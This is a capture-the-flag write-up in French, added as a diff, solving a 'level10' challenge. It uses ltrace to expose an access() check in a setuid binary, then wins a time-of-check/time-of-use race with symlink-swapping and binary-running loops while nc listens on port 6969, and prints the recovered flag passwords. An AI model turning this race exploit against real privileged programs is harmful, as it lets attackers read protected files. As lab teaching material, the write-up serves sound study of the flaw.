@@ -1,0 +1,57 @@
+Nous sommes ici en la presence encore une fois d'une binaire level10 et d'un token sans droit de lecture.
+En executant le binaire, le retour nous indique qu'il faut envoyer un fichier (en l'occurence ici le fichier token) a l'hote (donc notre IP)
+
+./level10 token 192.168.0.39 : You don't have access to token
+
+Analysons un peu le binaire grace a ltrace ./level10 token <IP_HOST> :
+
+__libc_start_main(0x80486d4, 3, 0xbffff7a4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+)  = 31
++++ exited (status 31) +++
+
+Il y a un appelle a la fonction access() qui verifie les permissions d'utilisateur et qui renvoie -1 quand il y a une erreur, ce qui est le cas ici.
+En creeant un fichier : touch /tmp/kento/kento et en lancant ltrace ./level10 /tmp/kento/kento 192.168.0.39 : 
+
+__libc_start_main(0x80486d4, 3, 0xbffff794, 0x8048970, 0x80489e0 <unfinished ...>
+access("/tmp/kento/kento", 4)                     = 0
+printf("Connecting to %s:6969 .. ", "192.168.0.39") = 35
+fflush(0xb7fd1a20Connecting to 192.168.0.39:6969 .. )                                = 0
+socket(2, 1, 0)                                   = 3
+inet_addr("192.168.0.39")                         = 0x2700a8c0
+htons(6969, 1, 0, 0, 0)                           = 14619
+connect(3, 0xbffff6dc, 16, 0, 0)                  = -1
+printf("Unable to connect to host %s\n", "192.168.0.39"Unable to connect to host 192.168.0.39
+) = 39
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+Nous voyons que le socket est envoyé a l'ip hote via le port 6969. Dans un autre terminal lancons la commande nc -lk 6969 et relancons la commande precedente : .*( )*.
+
+Essayons de creer un script qui va executer sans interruption la creation d'un fichier /tmp/kento/kento en lien avec le fichier token et qui le supprime et ainsi de suite dans un fichier script.sh :
+
+mkdir /tmp/kento/kento
+while [ 1 ]
+do
+	rm -rf /tmp/kento/kento
+	touch /tmp/kento/kento
+	rm -rf /tmp/kento/kento
+	ln -s ~/token /tmp/kento/kento
+done
+
+Et dans un autre fichier un script qui execute la commande sans interruption.
+
+while [ 1 ]
+do
+	./level10 /tmp/kento/kento 192.168.0.39
+done
+
+Cette pratique s'appelle une race condition. Elle a pour principe d'essayer de changer entre le moment de la verification et de l'execution la valeur de ce qui est verifie
+
+Nous voyons sur le terminal ou nc -lk 6969 est actif defiler rapidement les memes symbole que precedemment mais de temps en temps nous pouvons constater le flag qui s'affiche : woupa2yuojeeaaed06riuj63c
+
+su flag10
+Password: woupa2yuojeeaaed06riuj63c
+getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
